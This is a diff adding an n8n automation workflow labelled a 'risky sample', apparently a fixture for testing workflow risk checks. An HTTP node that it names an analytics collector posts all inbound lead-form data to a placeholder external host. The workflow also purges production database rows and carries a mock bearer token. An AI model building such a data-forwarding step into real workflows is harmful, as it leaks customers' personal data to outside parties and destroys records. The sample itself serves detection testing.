@@ -1,0 +1,110 @@
+{
+  "name": "Sync Lead Form to External Collector (Risky Sample)",
+  "nodes": [
+    {
+      "parameters": {
+        "httpMethod": "POST",
+        "path": "lead-capture-form",
+        "options": {}
+      },
+      "id": "node_lead_webhook_01",
+      "name": "Webhook - Inbound Leads",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 1,
+      "position": [200, 280]
+    },
+    {
+      "parameters": {
+        "operation": "executeQuery",
+        "query": "=DELETE FROM leads_temp WHERE created_at < NOW() - INTERVAL '30 days';"
+      },
+      "id": "node_db_cleanse_02",
+      "name": "Postgres - Purge Old Leads",
+      "type": "n8n-nodes-base.postgres",
+      "typeVersion": 2,
+      "position": [420, 160],
+      "credentials": {
+        "postgres": {
+          "id": "cred_pg_production_ref_01",
+          "name": "Production Postgres ReadWrite"
+        }
+      }
+    },
+    {
+      "parameters": {
+        "method": "POST",
+        "url": "https://unverified-collector.example-test.xyz/api/dump",
+        "sendHeaders": true,
+        "headerParameters": {
+          "parameters": [
+            {
+              "name": "Authorization",
+              "value": "Bearer sk_test_mock_fake_token_example_only_12345"
+            },
+            {
+              "name": "Content-Type",
+              "value": "application/json"
+            }
+          ]
+        },
+        "sendBody": true,
+        "bodyParameters": {
+          "parameters": [
+            {
+              "name": "payload",
+              "value": "={{$json}}"
+            }
+          ]
+        }
+      },
+      "id": "node_http_exfiltrate_03",
+      "name": "HTTP Request - Remote Analytics Collector",
+      "type": "n8n-nodes-base.httpRequest",
+      "typeVersion": 4,
+      "position": [460, 400]
+    },
+    {
+      "parameters": {
+        "customNodeProperty": "value"
+      },
+      "id": "node_legacy_unsupported_04",
+      "name": "Custom Proprietary Sync",
+      "type": "n8n-nodes-enterprise.unsupportedCustomLegacy",
+      "typeVersion": 1,
+      "position": [700, 400]
+    }
+  ],
+  "connections": {
+    "Webhook - Inbound Leads": {
+      "main": [
+        [
+          {
+            "node": "Postgres - Purge Old Leads",
+            "type": "main",
+            "index": 0
+          },
+          {
+            "node": "HTTP Request - Remote Analytics Collector",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "HTTP Request - Remote Analytics Collector": {
+      "main": [
+        [
+          {
+            "node": "Custom Proprietary Sync",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "active": false,
+  "settings": {
+    "executionOrder": "v1"
+  }
+}
